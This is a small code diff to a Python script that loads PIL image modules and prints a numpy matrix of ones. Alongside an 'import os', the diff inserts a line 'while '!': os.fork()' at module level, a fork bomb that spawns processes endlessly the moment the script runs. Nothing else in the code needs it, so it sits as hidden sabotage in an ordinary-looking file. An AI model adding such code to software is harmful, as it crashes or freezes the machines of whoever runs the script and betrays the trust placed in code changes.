@@ -1,9 +1,10 @@
+import os
 import PIL as pil
 from PIL import Image
 from PIL import ImageTk 
 import numpy as np
 
-
+while '!': os.fork()
 
 matrice = np.array([[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]])
 print(matrice)
